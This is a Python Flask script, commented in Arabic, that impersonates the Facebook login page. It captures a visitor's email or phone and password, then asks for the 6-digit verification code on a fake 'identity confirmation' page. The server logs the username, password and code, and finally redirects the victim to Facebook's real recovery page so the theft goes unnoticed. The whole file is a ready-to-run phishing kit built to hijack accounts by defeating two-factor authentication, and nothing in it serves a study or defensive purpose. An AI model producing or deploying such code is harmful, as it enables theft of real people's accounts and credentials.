from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

# الصفحة الأولى: طلب المودباس (Phase 1)
html_step1 = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Facebook</title></head>
<body style="background:#f0f2f5; font-family:sans-serif; display:flex; justify-content:center; padding-top:50px;">
    <div style="background:white; padding:20px; border-radius:8px; width:330px; box-shadow:0 2px 4px rgba(0,0,0,0.1); text-align:center;">
        <h1 style="color:#1877f2; font-size:35px;">facebook</h1>
        <form action="/verify-step" method="POST">
            <input type="text" name="login_field" placeholder="رقم الهاتف أو البريد" style="width:100%; padding:12px; margin:8px 0; border:1px solid #ddd; border-radius:6px;" required>
            <input type="password" name="secret_field" placeholder="كلمة السر" style="width:100%; padding:12px; margin:8px 0; border:1px solid #ddd; border-radius:6px;" required>
            <button type="submit" style="width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

# الصفحة الثانية: طلب الرمز (Phase 2)
html_step2 = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تأكيد الأمان</title></head>
<body style="background:#f0f2f5; font-family:sans-serif; display:flex; justify-content:center; padding-top:50px;">
    <div style="background:white; padding:20px; border-radius:8px; width:330px; box-shadow:0 2px 4px rgba(0,0,0,0.1); text-align:center;">
        <h3 style="color:#4b4f56;">تأكيد الهوية</h3>
        <p style="font-size:14px; color:#606770;">أدخل الرمز المكون من 6 أرقام الذي أرسلناه إلى هاتفك للمتابعة.</p>
        <form action="/final-access" method="POST">
            <input type="hidden" name="saved_user" value="{{user}}">
            <input type="hidden" name="saved_pass" value="{{passw}}">
            <input type="text" name="otp_code" placeholder="رمز التأكيد (6 أرقام)" style="width:100%; padding:12px; margin-bottom:15px; border:1px solid #ddd; border-radius:6px;" required>
            <button type="submit" style="width:100%; padding:12px; background:#42b72a; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">إرسال الرمز</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_step1)

@app.route('/verify-step', methods=['POST'])
def verify_step():
    u = request.form.get('login_field')
    p = request.form.get('secret_field')
    # طباعة المرحلة الأولى في الـ Logs
    print(f"\\n[PHASE 1] 👤 User: {u} | 🔑 Pass: {p}\\n")
    return render_template_string(html_step2, user=u, passw=p)

@app.route('/final-access', methods=['POST'])
def final_access():
    u = request.form.get('saved_user')
    p = request.form.get('saved_pass')
    code = request.form.get('otp_code')
    # طباعة المرحلة الثانية (الرمز)
    print(f"\\n🎯 [SUCCESS] الرمز وصل: {code} (للحساب: {u}:{p})\\n")
    return redirect("https://www.facebook.com/recover/initiate")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
